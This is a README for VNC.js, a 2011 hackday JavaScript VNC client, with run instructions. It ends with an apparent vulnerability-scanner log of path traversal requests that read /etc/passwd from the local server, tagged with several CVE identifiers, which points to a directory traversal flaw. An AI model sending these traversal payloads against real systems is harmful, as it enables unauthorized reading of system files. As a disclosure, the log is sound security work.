# VNC.js
VNC.js is a LinkedIn intern hackday 2011 2011 project, read the blog post about VNC.js: http://engineering.linkedin.com/javascript/vncjs-how-build-javascript-vnc-client-24-hour-hackday

You need a VNC server to make this work, like: x11vnc on Ubuntu.

# Disclaimer
This project was developed over 24 sleep deprived hours, the code is messy and undocumented.

# How Use
```
node server.js
open http://127.0.0.1:1024/
```
## but ...

```
[2021-10-12 12:19:30] [CVE-2010-4231] [http] [high] http://127.0.0.1:1024/../../../../../../../../../../../../../etc/passwd
[2021-10-12 12:19:31] [CVE-2017-16877] [http] [high] http://127.0.0.1:1024/_next/../../../../../../../../../../etc/passwd
[2021-10-12 12:19:33] [CVE-2018-3714] [http] [medium] http://127.0.0.1:1024/node_modules/../../../../../etc/passwd
[2021-10-12 12:19:34] [CVE-2017-14849] [http] [high] http://127.0.0.1:1024/static/../../../a/../../../../etc/passwd
[2021-10-12 12:19:36] [CVE-2015-3337] [http] [high] http://127.0.0.1:1024/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd

```